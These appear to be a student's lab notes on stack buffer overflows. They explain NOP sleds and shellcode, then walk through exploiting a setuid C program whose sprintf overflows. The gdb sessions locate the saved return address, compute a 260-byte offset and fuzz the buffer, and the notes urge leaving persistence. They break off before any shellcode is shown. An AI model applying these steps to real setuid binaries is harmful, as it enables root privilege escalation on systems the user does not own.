
>[!  Current situation]
>First of all:
>- Many CERT security incidents today are still buffer overflows.
>- C and C++ in generally do not perform array bound checks.
>- Possible to write past the end of an array and plant malicious code (payload) or highjack control (by overwriting the returning address).

To understand better about this attack at a deep-under-the-hood level, let see the structure of a `Call Stack` (the memory in which a program resides during its execution).
```text
		   high addresses 
fp ------> +ooooooooooooooo+ |
           +ooooooooooooooo+ |
           +ooooooooooooooo+ |
sp ------> +---------------+ |
           +---------------+ |
           +---------------+ |
           +---------------+ |
           +---------------+ |
           +---------------+ |
           +---------------+ v
           low addresses 
```

We have 2 pointers, the first one is `fp` - frame pointer, points to the start of  the stack, this pointer will move depends on how many time another functions were called during the program's execution.

The second one is the `sp` - stack pointer, point to the currently executed address.

```Go
// begin to call a function
push arg1;...; push argN // push the necessary arguments into the stack
push return_address; // the address just next to the function once it completed

// within the callee (the called function)
push fp; // save the old frame pointer to return
fp := sp; // move the frame to current stack
sp := sp + sizeof(local_vars); // move to spend enough spaces for args
// complete setup and execution
sp := fp; // move stack pointer back to frame pointer, delete all func vars.
fp := pop(); // recover old frame
pc := pop(); //
```

Currently vulnerable functions: `strcat`, `strcpy`, `scanf`, `sscanf`, `gets`, `read`,... since all of them do not provide any boundary checking.

# 1. Shellcode

In the `Linux`, the main any maybe most "programmer-alike" way to use it is through a `Shell` - an interface allow users to freely navigate themselves in the Operating System. But first of all, there are several things to keep in mind:
- Shell code spawns a shell under the `uid` of the caller process, which means, if the `uid` was elevated to root, this will give you a `root` shell.
- How to make sure buffer address overwrites return address?, well we have something like this in the address space: `[shellcode][ADDR][ADDR][ADDR]...`
- And how to make sure the return pointer will point only to shell code? Implement the No-op sled, leaving a vast space and the hacker can jump fast: `[NOP][NOP][NOP]...[shellcode]`.
The `gcc` and `gdb` can be used to extract assembly and hex representations. Also, the `NOP` on the x86 system has the machine code of `0x90`. And that leads to the question "How do you guess the ADDR to put the payload":
- The first stack frame should be found first, and this is deterministic in some Linux kernels, not too hard to find.
- Offset can be calculated from experiments with different length overruns in `gdb`. 
- Attack string example: `[NOP][NOP][NOP]...[shellcode][ADDR][ADDR][ADDR]...`

An example of a vulnerable program:
```C
char buf[100];
...
gets(buf);
```

This illustrates a case that we try to inject an attack payload into the above program:
```text
		   high addresses 
           +ooooooooooooooo+ |
           +ooooooooooooooo+ |
           +ooooooooooooooo+ |
fp ------> +-----addr------+ |
           +-----addr------+ |
           +---shellcode---+ |
           +-----[NOP]-----+ |
sp ------> +-----[NOP]-----+ |
           +---------------+ |
           +---------------+ v
           low addresses 
```

In this payload, when the `sp` jumps back after successfully completed some stuff, in this case, since `buf[]` was filled with more data than its capacity, the `fp` and `pc` (program counter) now point to: a malicious `shellcode` or redirect the program to `addr`.

# The lab

It is quite "simple", giving a program, try to find way to exploit it by using the buffer overflows attack. And maybe try to fix it? Really not paid attention about the "fixing" stuff.

First one is the program:
```C
#include <stdio.h>
#include <stdlib.h>

#define HOSTNAMELEN 256
#define IPADDR 1
#define HOSTNAME 2
#define ALIAS 3
#define HOSTFILE "/etc/hosts"

void add_alias(char *ip, char *hostname, char *alias) {
	char formatbuffer[256];
	FILE *file;

	sprintf(formatbuffer, "%s\t%s\t%s\n", ip, hostname, alias);

	file = fopen(HOSTFILE, "a");
	if (file == NULL) {
		perror("fopen");
		exit(EXIT_FAILURE);
	}

	fprintf(file, formatbuffer);

	if (fclose(file) != 0) {
		perror("close");
		exit(EXIT_FAILURE);
	}
}

int main(int argc, char *argv[]) {
	if (argc != 4) {
		printf("Usage: %s ipaddress hostname alias \n", argv[0]);
		exit(EXIT_FAILURE);
	}

	add_alias(argv[IPADDR], argv[HOSTNAME], argv[ALIAS]);

	return(0);
}
```

The program takes the user's input then appends a new entry into the `\etc\hosts` file. But the final goal is to take control of the shell and execute whatever commands the attacker wants.

Why?. because the file was compiled and placed inside `\usr\bin` with `suid` bit was set. That means, this process is run with the permission of owner, not the invoked user.

As said earlier, the function `sprintf()` is vulnerable, since it does not provide any built-in or additionally boundary check. So with the forged payload, it is feasible to drive the program to execute malicious code.

There are several things to take into account:
+ Attack must be successfully first.
+ Attack should leave something persistent in the system, otherwise, a simple reboot command can evict the adversary out.

# How-to

First, need to take a glance into how the code was executed and which address space the code would be run.

Also, `gdb`cannot run with same permission as executed program, so need a flag `-q`and some trick to overcome this.

```Bash
dvader@deathstar:~$ gdb -q /usr/bin/addhostalias    
(gdb) disas add_alias  
Dump of assembler code for function add_alias:  
0x8048540 <add_alias>:  push   %ebp  
0x8048541 <add_alias+1>:        mov    %esp,%ebp  
0x8048543 <add_alias+3>:        sub    $0x118,%esp  
0x8048549 <add_alias+9>:        add    $0xfffffff4,%esp  
0x804854c <add_alias+12>:       mov    0x10(%ebp),%eax  
0x804854f <add_alias+15>:       push   %eax  
0x8048550 <add_alias+16>:       mov    0xc(%ebp),%eax  
0x8048553 <add_alias+19>:       push   %eax  
0x8048554 <add_alias+20>:       mov    0x8(%ebp),%eax  
0x8048557 <add_alias+23>:       push   %eax  
0x8048558 <add_alias+24>:       push   $0x80486e0  
0x804855d <add_alias+29>:       lea    0xffffff00(%ebp),%eax  
0x8048563 <add_alias+35>:       push   %eax  
0x8048564 <add_alias+36>:       call   0x8048450 <sprintf>  
0x8048569 <add_alias+41>:       add    $0x20,%esp
```

This command allows user to inspect the assembly code of the function. As in this, we need to inspect which is the address of the command right after the print command. Also, since the gdb session did not have root privilege, write operation to host file was not permitted. Break point is a good way to do so. The command after call is to clean the stack of old data, set a point at that allow to observe the memory once the data had been stored in the memory.

```Bash
(gdb) x/50xw $esp  
0xbffffb34:     0xbffffb6c      0x080486e0      0xbffffdfe      0xbffffe08  
0xbffffb44:     0xbffffe16      0x04d6dad3      0x00000060      0xbffffc30  
0xbffffb54:     0x4000736f      0x00000000      0x400272c1      0x4001432c  
0xbffffb64:     0x40007099      0x08048241      0x2e373231      0x2e302e30  
0xbffffb74:     0x6f6c0931      0x2d6c6163      0x6863616d      0x09656e69  
0xbffffb84:     0x686d636c      0x4001000a      0x00000001      0xbffffbb8  
0xbffffb94:     0x08048180      0x40014a7c      0x078e530f      0x078e530f  
0xbffffba4:     0xbffffc4c      0x40014938      0x080482ad      0x40014dc0  
0xbffffbb4:     0x00000003      0x40021f48      0x40014dc0      0xbffffbe8  
0xbffffbc4:     0x4001eb98      0x40014f04      0x03df6174      0x03df6174  
0xbffffbd4:     0xbffffc7c      0x40014dc0      0x400250f8      0x40014dc0  
0xbffffbe4:     0x00000003      0x4001eb98      0x40014dc0      0xbffffc18  
0xbffffbf4:     0x080481c0      0x40014a7c
```

This command allows us to look directly in the stack memory, and we can clearly see that the input string was represented here `0x2e373231` which equals to `.721` (printed backward). And the start of address was `0xbffffb64` - contained 4 words, and the third word is our data. So the actual address was base + 3 (1 for each), finally, got `0xbffffb6c`

We also need to look up into saved register, where the old value of `eip` was store

```Bash
(gdb) info frame  
Stack level 0, frame at 0xbffffc6c:  
eip = 0x8048569 in add_alias; saved eip 0x8048656  
called by frame at 0xbffffc8c  
Arglist at 0xbffffc6c, args:    
Locals at 0xbffffc6c, Previous frame's sp is 0x0  
Saved registers:  
 ebp at 0xbffffc6c, eip at 0xbffffc70
```

So, we need at least `0xbffffc70 - 0xbffffb6c = 260` bytes for this payload

As said earlier, attack payload should be look like: `[NOP]...[NOP][ShellCode][ADDR]...[ADDR]`, and the `[ADDR]` should be landed somewhere within no-operation sled for the CPU to slide into shell code section. To do so, we need to craft the payload at least 260 bytes as calculated before. And find the section of the no-operation.

Simply, put some useless payload, dump the assembly, put the break point then inspect the memory.

```Bash
dvader@deathstar:~$ gdb -q /usr/bin/addhostalias                                                 
(gdb) break *0x8048569  
Breakpoint 1 at 0x8048569  
(gdb) run 127.0.0.1 $(python -c "print('A' * 300)") testalias  
Starting program: /usr/bin/addhostalias 127.0.0.1 $(python -c "print('A' * 300)") testalias  
  
Breakpoint 1, 0x08048569 in add_alias ()  
(gdb) x/100xw $esp  
0xbffffa04:     0xbffffa3c      0x080486e0      0xbffffcda      0xbffffce4  
0xbffffa14:     0xbffffe11      0x04d6dad3      0x00000060      0xbffffb00  
0xbffffa24:     0x4000736f      0x00000000      0x400272c1      0x4001432c  
0xbffffa34:     0x40007099      0x08048241      0x2e373231      0x2e302e30  
0xbffffa44:     0x41410931      0x41414141      0x41414141      0x41414141  
0xbffffa54:     0x41414141      0x41414141      0x41414141      0x41414141  
0xbffffa64:     0x41414141      0x41414141      0x41414141      0x41414141  
0xbffffa74:     0x41414141      0x41414141      0x41414141      0x41414141  
0xbffffa84:     0x41414141      0x41414141      0x41414141      0x41414141  
0xbffffa94:     0x41414141      0x41414141      0x41414141      0x41414141  
0xbffffaa4:     0x41414141      0x41414141      0x41414141      0x41414141  
0xbffffab4:     0x41414141      0x41414141      0x41414141      0x41414141  
0xbffffac4:     0x41414141      0x41414141      0x41414141      0x41414141  
0xbffffad4:     0x41414141      0x41414141      0x41414141      0x41414141  
0xbffffae4:     0x41414141      0x41414141      0x41414141      0x41414141  
0xbffffaf4:     0x41414141      0x41414141      0x41414141      0x41414141  
0xbffffb04:     0x41414141      0x41414141      0x41414141      0x41414141  
0xbffffb14:     0x41414141      0x41414141      0x41414141      0x41414141  
0xbffffb24:     0x41414141      0x41414141      0x41414141      0x41414141  
0xbffffb34:     0x41414141      0x41414141      0x41414141      0x41414141  
0xbffffb44:     0x41414141      0x41414141      0x41414141      0x41414141  
0xbffffb54:     0x41414141      0x41414141      0x41414141      0x41414141  
0xbffffb64:     0x41414141      0x41414141      0x41414141      0x74094141  
0xbffffb74:     0x61747365      0x7361696c      0x4003000a      0x400143ac  
0xbffffb84:     0x00000004      0x08048460      0xbffffbc4      0x400300c0
```

(not the useless `0x41414141` stands for AAAA)
